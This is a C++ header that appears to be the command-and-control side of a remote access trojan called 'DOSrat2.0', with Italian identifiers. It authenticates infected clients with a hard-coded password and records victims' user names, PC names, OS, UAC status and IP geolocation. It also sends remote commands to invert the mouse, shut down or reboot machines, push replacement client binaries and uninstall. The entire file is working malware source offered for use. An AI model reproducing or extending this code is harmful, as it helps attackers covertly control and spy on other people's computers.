#pragma once

class COMUNICAZIONI
{
private:
	static void TerminaConnessione(SOCKET Sock)
	{
		TcpIP::SetTimeout(0, Sock);
		closesocket(Sock);
	}

public:
	static void Inizializzazione(int ID, SOCKET Sock)
	{
		char Pass[10]; // DOSrat2.0

		TcpIP::SetTimeout(10000, Sock);

		if (recv(Sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
		{
			TerminaConnessione(Sock);
			return;
		}
		if ((string)Pass != "DOSrat2.0")
		{
			TerminaConnessione(Sock);
			return;
		}
		if (send(Sock, "DOSrat2.0", 10, 0) == SOCKET_ERROR)
		{
			TerminaConnessione(Sock);
			return;
		}

		TcpIP::SetTimeout(0, Sock);

		json data = json::parse(TcpIP::RecvString(Sock));

		Clients[ID].IsConnected = true;
		Clients[ID].info.InstallPath = data["InstallPath"];
		Clients[ID].info.OS = data["OS"];
		Clients[ID].info.PCname = data["PCname"];
		Clients[ID].info.UAC = data["UAC"];
		Clients[ID].info.UserName = data["UserName"];
		Clients[ID].info.Versione = data["Versione"];

		Clients[ID].info.IP = TcpIP::GetIP(Sock);
		IPlocation::GetInfoFromIP(Clients[ID].info.IP, Clients[ID].info.Location);

		Clu->AggiornaTitolo();
	}

	static json GetInfo(SOCKET Sock)
	{
		string Buff;
		json j;

		TcpIP::SendString(Sock, "getinfo");

		Buff = TcpIP::RecvString(Sock);

		if(Buff != "")
			j = json::parse(Buff);

		return j;
	}

	static string InvertMouse(SOCKET Sock)
	{
		string Buff;

		TcpIP::SendString(Sock, "invertmouse");

		Buff = TcpIP::RecvString(Sock);

		return Buff;
	}

	static bool Reconnect(SOCKET Sock)
	{
		return TcpIP::SendString(Sock, "reconnect");
	}

	static bool KillClient(SOCKET Sock)
	{
		return TcpIP::SendString(Sock, "kill");
	}

	static bool Shutdown(SOCKET Sock)
	{
		return TcpIP::SendString(Sock, "shutdown");
	}

	static bool Reboot(SOCKET Sock)
	{
		return TcpIP::SendString(Sock, "reboot");
	}

	static bool UpdateClient(SOCKET Sock, string FileContent)
	{
		if (!TcpIP::SendString(Sock, "updateclient"))
			return false;

		if (!TcpIP::SendString(Sock, FileContent))
			return false;

		return (TcpIP::RecvString(Sock) == "OK");
	}

	static bool Uninstall(SOCKET Sock)
	{
		return TcpIP::SendString(Sock, "uninstall");
	}
};